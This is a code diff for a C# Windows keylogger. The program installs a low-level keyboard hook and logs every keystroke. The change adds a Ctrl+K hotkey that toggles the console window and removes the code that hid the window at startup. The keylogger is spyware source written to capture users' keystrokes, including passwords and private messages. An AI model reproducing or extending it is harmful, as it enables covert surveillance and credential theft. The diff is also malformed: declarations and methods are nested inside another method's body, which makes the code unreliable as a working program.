@@ -49,6 +49,7 @@ namespace Keylogger
             {
                 int vkCode = Marshal.ReadInt32(lParam);
 
+                CheckHotKey(vkCode);
                 WriteLog(vkCode);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
@@ -69,18 +70,58 @@ namespace Keylogger
             Application.Run();
             UnhookWindowsHookEx(_hookID);
         }
-        #endregion
 
-        #region windows
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
+        static bool isHotKey = false;
+        static bool isShowing = false;
+        static Keys previousKey = Keys.Separator;
 
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        static void CheckHotKey(int vkCode)
+        {
+            if ((previousKey == Keys.LControlKey || previousKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.K)
+                isHotKey = true;
 
-        const int SW_HIDE = 0;
+            if (isHotKey)
+            {
+                if (!isShowing)
+                {
+                    DisplayWindow();
+                }
+                else
+                {
+                    HideWindow();
+                }
 
-        const int SW_SHOW = 5;
+                isShowing = !isShowing;
+            }
+
+
+            previousKey = (Keys)vkCode;
+            isHotKey = false;
+            #endregion
+
+            #region windows
+            [DllImport("kernel32.dll")]
+            static extern IntPtr GetConsoleWindow();
+
+            [DllImport("user32.dll")]
+            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+            const int SW_HIDE = 0;
+
+            const int SW_SHOW = 5;
+
+            static void HideWindow()
+            {
+                var console = GetConsoleWindow();
+                ShowWindow(console, SW_HIDE);
+            }
+
+            static void DisplayWindow()
+            {
+                var console = GetConsoleWindow();
+                ShowWindow(console, SW_SHOW);
+            }
+        }
         #endregion
 
         #region timer
@@ -154,8 +195,6 @@ namespace Keylogger
         [STAThread]
         static void Main(string[] args)
         {
-            var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE);
             StartTimer();
             HookKeyBoard();
         }
